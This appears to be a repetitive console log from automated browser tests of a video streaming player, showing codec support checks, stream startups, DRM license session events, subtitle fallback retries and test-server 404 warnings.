'+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 364, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 377, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\nINFO: 'Trying fallback URL...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\n.13 01 2016 13:21:34.182:WARN [web-server]: 404: /base/assets/does_not_exist?_=1452720094176\n13 01 2016 13:21:34.848:WARN [web-server]: 404: /base/assets/does_not_exist?_=1452720094845\n13 01 2016 13:21:36.689:WARN [web-server]: 404: /base/assets/does_not_exist?_=1452720096685\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 